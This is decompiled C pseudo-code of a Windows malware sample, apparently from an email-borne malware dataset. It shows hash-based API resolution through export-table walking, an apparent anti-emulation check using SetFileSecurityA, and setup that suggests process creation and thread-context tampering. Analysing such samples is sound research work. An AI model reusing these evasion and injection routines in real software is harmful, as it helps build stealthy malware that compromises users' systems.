// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0057/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn0040125D(word32 ecx)
{
	GetModuleFileNameA(0x00000000, 0x00403780, 0x00000104);
	Mem0[0x00403164:word32]();
	Mem0[0x00403168:word32]();
	Mem0[0x00403168:word32]();
	Mem0[0x00403168:word32]();
	Mem0[0x00403168:word32]();
	Mem54[0x00403988:word32] = 0x00000044;
	Mem55[0x004039B4:word32] = 0x00000001;
	Mem57[0x004039B8:word16] = 0x0002;
	Mem57[0x004039DC:word32]();
	GetModuleHandleA(0x00000000);
	Mem57[0x004039E0:word32]();
	Mem57[0x004039E4:word32]();
	Mem110[0x004039E8:word32] = 0x00010007;
	Mem110[0x00403CB4:word32]();
	Mem117[0x00403AA0:word32] = 0x00401000;
	Mem117[0x00403CB8:word32]();
	Mem117[0x00403CBC:word32]();
	return ecx + 0x00401000;
}

void fn004013B0(word32 ecx)
{
	word32 eax_13 = LoadLibraryW(0x00402000);
	word32 ecx_22;
	word32 eax_23 = fn004015E8(eax_13 + ecx, ecx, eax_13, 0x42399AE1, out ecx_22);
	Mem25[0x004039DC:word32] = eax_23;
	word32 ecx_31;
	word32 eax_32 = fn004015E8(eax_23 + ecx_22, ecx_22, eax_13, 0x9EB7A880, out ecx_31);
	Mem34[0x004039E0:word32] = eax_32;
	word32 ecx_40;
	word32 eax_41 = fn004015E8(eax_32 + ecx_31, ecx_31, eax_13, 0xC05D44C3, out ecx_40);
	Mem43[0x004039E4:word32] = eax_41;
	word32 ecx_48;
	word32 eax_49 = fn004015E8(eax_41, ecx_40, eax_13, 0xAE141BD9, out ecx_48);
	Mem51[0x00403CB4:word32] = eax_49;
	word32 ecx_57;
	word32 eax_58 = fn004015E8(eax_49 + ecx_48, ecx_48, eax_13, 0xAE1433D9, out ecx_57);
	Mem60[0x00403CB8:word32] = eax_58;
	word32 ecx_65;
	word32 eax_66 = fn004015E8(eax_58, ecx_57, eax_13, 0xD0C0AF1A, out ecx_65);
	Mem68[0x00403CBC:word32] = eax_66;
	word32 ecx_74;
	word32 eax_75 = fn004015E8(eax_66 + ecx_65, ecx_65, eax_13, 0x31504A78, out ecx_74);
	Mem77[0x00403CC0:word32] = eax_75;
	word32 ecx_83;
	word32 eax_84 = fn004015E8(eax_75 + ecx_74, ecx_74, eax_13, 0x3EC6BB38, out ecx_83);
	Mem86[0x00403CC4:word32] = eax_84;
	word32 ecx_92;
	word32 eax_93 = fn004015E8(eax_84 + ecx_83, ecx_83, eax_13, 0x63E49007, out ecx_92);
	Mem95[0x0040316C:word32] = eax_93;
	word32 ecx_101;
	word32 eax_102 = fn004015E8(eax_93 + ecx_92, ecx_92, eax_13, 0x73F718BD, out ecx_101);
	Mem104[0x00403168:word32] = eax_102;
	word32 ecx_110;
	word32 eax_111 = fn004015E8(eax_102 + ecx_101, ecx_101, eax_13, 0x73F35E3D, out ecx_110);
	Mem113[0x00403164:word32] = eax_111;
	word32 ecx_118;
	word32 eax_119 = fn004015E8(eax_111, ecx_110, eax_13, 0x721615BD, out ecx_118);
	Mem121[0x00403CC8:word32] = eax_119;
	word32 ecx_126;
	word32 eax_127 = fn004015E8(eax_119, ecx_118, eax_13, 0x6324080E, out ecx_126);
	Mem129[0x00403174:word32] = eax_127;
	word32 ecx_134;
	word32 eax_135 = fn004015E8(eax_127, ecx_126, eax_13, 0x20E67883, out ecx_134);
	Mem137[0x00403170:word32] = eax_135;
	word32 ecx_142;
	word32 eax_143 = fn004015E8(eax_135, ecx_134, eax_13, 0x2AA660FE, out ecx_142);
	Mem145[0x00403178:word32] = eax_143;
	word32 ecx_150;
	word32 eax_151 = fn004015E8(eax_143, ecx_142, eax_13, 0xA3AE6135, out ecx_150);
	Mem153[0x00403CCC:word32] = eax_151;
	word32 ecx_158;
	word32 eax_159 = fn004015E8(eax_151, ecx_150, eax_13, 0xA4697C98, out ecx_158);
	Mem161[0x00403CD0:word32] = eax_159;
	word32 ecx_167;
	Mem170[0x00403CD4:word32] = fn004015E8(eax_159 + ecx_158, ecx_158, eax_13, 0xD96820F4, out ecx_167);
	Mem170[0x00403164:word32]();
	Mem170[0x00403168:word32]();
	Mem170[0x00403168:word32]();
	Mem170[0x00403168:word32]();
	Mem170[0x0040316C:word32]();
	word32 ecx_201;
	word32 eax_202 = fn004015E8(fp - 0x00000024, ecx_167, fp - 0x00000024, 0xC3B6C984, out ecx_201);
	Mem204[0x00403CD8:word32] = eax_202;
	word32 ecx_210;
	word32 eax_211 = fn004015E8(eax_202 + ecx_201, ecx_201, fp - 0x00000024, 0xAC512DF6, out ecx_210);
	Mem213[0x00403CDC:word32] = eax_211;
	word32 ecx_218;
	word32 eax_219 = fn004015E8(eax_211, ecx_210, fp - 0x00000024, 0xBC744690, out ecx_218);
	Mem221[0x00403CE0:word32] = eax_219;
	word32 ecx_226;
	word32 eax_227 = fn004015E8(eax_219, ecx_218, fp - 0x00000024, 0x1E28D294, out ecx_226);
	Mem229[0x00403CE4:word32] = eax_227;
	word32 ecx_234;
	word32 eax_235 = fn004015E8(eax_227, ecx_226, fp - 0x00000024, 0x0DE900C7, out ecx_234);
	Mem237[0x00403CE8:word32] = eax_235;
	word32 eax_238 = eax_235 + ecx_234;
	Mem237[0x0040316C:word32]();
	word32 ecx_247;
	Mem250[0x00403CEC:word32] = fn004015E8(eax_238 + ecx_234, ecx_234, eax_238, 0xF303D8B8, out ecx_247);
	fn0040125D(ecx_247);
	Mem250[0x00403CC4:word32]();
	return;
}

word32 fn004015E8(word32 eax, word32 ecx, word32 dwArg04, word32 dwArg08, ptr32 ecxOut)
{
	word32 eax_29 = Mem0[Mem0[dwArg04 + 0x0000003C:word32] + dwArg04 + 0x00000078:word32] + dwArg04;
	word32 eax_32 = Mem0[eax_29 + 0x00000024:word32] + dwArg04;
	word32 esi_138 = dwArg08;
	word32 ecx_26;
	*ecxOut = dwArg04;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		esi_138 = dwArg08 + 0x000555E7;
	word32 eax_50 = Mem0[eax_29 + 0x00000020:word32] + dwArg04;
	word32 eax_54 = Mem0[eax_29 + 0x0000001C:word32] + dwArg04;
	word32 edi_121 = 0x00000000;
	word32 eax_119;
	while (edi_121 < Mem0[eax_29 + 0x00000018:word32])
	{
		word32 eax_96 = eax_50[edi_121 * 0x00000004] + dwArg04;
		dwLoc1C = dwLoc1C & 0x00000000;
		word32 eax_101 = 0x00000000;
		word32 ecx_109;
		*ecxOut = eax_96;
		while (Mem0[dwLoc1C + eax_96:byte] != 0x00)
		{
			eax_101 = (eax_101 << 0x00000007 | eax_101 >>u 0x00000019) ^ ((int32) Mem0[dwLoc1C + eax_96:byte] ^ 0x000000F4);
			dwLoc1C = dwLoc1C + 0x00000001;
			*ecxOut = eax_96;
		}
		if (eax_101 == esi_138)
		{
			eax_119 = eax_54[(word32) eax_32[edi_121 * 0x0002] * 0x00000004] + dwArg04;
			goto l004016AF;
		}
		edi_121 = edi_121 + 0x00000001;
	}
	eax_119 = 0x00000000;
l004016AF:
	return eax_119;
}

